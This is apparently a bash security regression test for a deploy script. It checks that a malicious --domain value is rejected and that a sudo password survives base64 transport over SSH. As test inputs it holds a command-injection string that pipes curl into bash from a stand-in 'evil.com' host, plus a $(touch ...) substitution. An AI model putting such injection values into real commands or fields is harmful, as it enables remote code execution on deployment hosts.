#!/usr/bin/env bash
# =============================================================================
# verify-deploy-ssh-injection.sh — guards CX-R14-01.
#
# scripts/deploy-prod.sh ships DOMAIN + SUDO_PASS to the remote inside an
# SSH command string. A naive single-quoted interpolation can be broken by a
# value containing `'` — both fields are operator-supplied and exploitable.
#
# Two-part fix verified here:
#   1. DOMAIN regex validator rejects metacharacter-laden values.
#   2. SUDO_PASS is base64-encoded over the SSH wire (base64 output is
#      shell-safe by definition), then decoded on the remote.
#
# Tests:
#   - Inject a malicious --domain → expect non-zero exit + clear error.
#   - Use a valid --domain --dry-run → expect zero exit (validation passed).
#   - Verify base64 round-trip preserves passwords with shell metacharacters.
# =============================================================================

set -euo pipefail

REPO_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
SCRIPT="$REPO_ROOT/scripts/deploy-prod.sh"

fail=0
section() { echo; echo "=== $1 ==="; }
VALID_DOMAIN="${CLAWNEX_TEST_DEPLOY_DOMAIN:-qa.example.invalid}"
TEST_VERSION="${CLAWNEX_TEST_DEPLOY_VERSION:-ssh-injection-test}"
TEST_TARBALL="$REPO_ROOT/deploy/clawnex-v${TEST_VERSION}-deploy.tar.gz"
TEST_TARBALL_CREATED=0
cleanup() {
  if [ "$TEST_TARBALL_CREATED" = "1" ]; then
    rm -f "$TEST_TARBALL"
  fi
}
trap cleanup EXIT
mkdir -p "$REPO_ROOT/deploy"
if [ ! -f "$TEST_TARBALL" ]; then
  printf 'test tarball placeholder for dry-run verification\n' > "$TEST_TARBALL"
  TEST_TARBALL_CREATED=1
fi

section "Test 1 — malicious --domain rejected"
INJECT="evil.com'; curl pwn | bash; #"
# Capture combined stdout+stderr; the script exits non-zero on rejection
# which set -euo pipefail would otherwise convert into an aborted pipeline.
INJECT_OUTPUT=$(SUDO_PASS='dummy' bash "$SCRIPT" \
                  --host nobody@nowhere.invalid \
                  --domain "$INJECT" \
                  --sudo-pass-env SUDO_PASS \
                  --dry-run 2>&1 || true)
if echo "$INJECT_OUTPUT" | grep -q "invalid --domain"; then
  echo "  PASS  injection attempt refused at validation"
else
  echo "  FAIL  malicious --domain was NOT rejected"
  echo "$INJECT_OUTPUT" | head -5
  fail=1
fi

section "Test 2 — valid --domain accepted (reaches dry-run exit)"
OUTPUT=$(SUDO_PASS='dummy' bash "$SCRIPT" \
           --host nobody@nowhere.invalid \
           --domain "$VALID_DOMAIN" \
           --version "$TEST_VERSION" \
           --sudo-pass-env SUDO_PASS \
           --dry-run 2>&1 || true)
if echo "$OUTPUT" | grep -q -- "--dry-run: exiting without executing"; then
  echo "  PASS  valid domain passes regex, reaches dry-run"
else
  echo "  FAIL  valid domain didn't reach dry-run exit"
  echo "$OUTPUT" | head -5
  fail=1
fi

section "Test 3 — base64 round-trip preserves shell-metacharacter passwords"
NASTY="aBc'k6 ;\$(touch /tmp/PWNED-\$\$).sh\""
ENCODED=$(printf '%s' "$NASTY" | base64 | tr -d '\n')
DECODED=$(printf '%s' "$ENCODED" | base64 -d)
if [ "$NASTY" = "$DECODED" ] && [[ "$ENCODED" =~ ^[A-Za-z0-9+/=]+$ ]]; then
  echo "  PASS  base64 envelope round-trips losslessly + is shell-safe"
else
  echo "  FAIL  base64 round-trip lost data or contains unsafe chars"
  fail=1
fi

# Defensive: ensure the PWN file the injection would have created doesn't exist
if [ -e "/tmp/PWNED-$$.sh" ]; then
  echo "  FAIL  injection PoC marker /tmp/PWNED-$$.sh was created"
  rm -f "/tmp/PWNED-$$.sh"
  fail=1
fi

echo
if [ "$fail" = "0" ]; then
  echo "PASS — deploy-prod.sh SSH injection surface closed"
  exit 0
fi
echo "FAIL — at least one SSH-injection guard test failed"
exit 1
